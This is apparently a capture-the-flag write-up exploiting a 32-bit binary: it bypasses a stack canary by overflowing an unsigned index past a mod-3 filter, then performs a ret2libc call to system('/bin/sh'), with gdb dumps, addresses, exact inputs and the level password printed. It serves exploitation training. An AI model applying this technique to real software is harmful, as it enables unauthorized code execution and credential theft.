# Write up

Canary here, but disassembling the code shows us than we can bypass it and still exploit a buffer overflow.

Reading the code, we can already guess that the int offset will be over 107.
By evaluating the stack offset, we search for eip offset using gdb :
```
# Break here :
# 80488f6:	eb 6d                	jmp    8048965 <main+0x242>
(gdb) break *0x080488f6
Breakpoint 1 at 0x80488f6
(gdb) run
...
Input command: store
 Number: 512 					// 0x00000200
 Index: 91
...
# 555555 => 0x00087a23
(gdb) x/200x $esp
...
0xffffd620:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd630:     [0x00000200]      0x00000000      0x00000000      0x00000000
0xffffd640:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x726f7473      0x00000065
0xffffd660:     0x00000000      0x00000000      0x00000000      0xa084d700 <= Generated canary here (index = 106), sigabort at quit if modified with a *** stack smashing detected ***:  terminated message
0xffffd670:     0xf7feb620      0x00000000      0x08048a09      0xf7fceff4
0xffffd680:     0x00000000      0x00000000      0x00000000      [0xf7e45513] <= Saved eip
0xffffd690:     0x00000001      0xffffd724      0xffffd72c      0xf7fd3000
0xffffd6a0:     0x00000000      0xffffd71c      0xffffd72c      0x00000000
0xffffd6b0:     0x080482b8      0xf7fceff4      0x00000000      0x00000000
0xffffd6c0:     0x00000000      0x88ba5601      0xbfbed211      0x00000000
...
(gdb) info frame
Stack level 0, frame at 0xffffd690:
 eip = 0x80488f6 in main; saved eip [0xf7e45513] <=
 Arglist at 0xffffd688, args:
 Locals at 0xffffd688, Previous frame's sp is 0xffffd690
 Saved registers:
  ebx at 0xffffd67c, ebp at 0xffffd688, esi at 0xffffd680, edi at 0xffffd684, eip at 0xffffd68c
```

By analysing the stack, we found the saved eip at index 114.
Howerer, 114 is escaped (38 x 3), so we have to input it in a more fancy way.

Pointers are on 4 bytes for 32-bit systems, so since the index given is an uint, we will overflow the pointer movement, make it do a whole turn in memory and comeback at the index 114, bypassing the mod 3 filter :
```
(index * UINT_MAX) / sizeof(uint32_t) <= 1073741938 for index = 114
```

Note that since we're given runtime addresses using 0xff~, the 0xb7~ filter is pointless here.
Lets prepare the ret2libC :
```
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>		// 4159090384, for index 104 (saved eip)
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec														// 4160264172, for index 106 (arg, 105 is junk)
```

Lets go :
```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```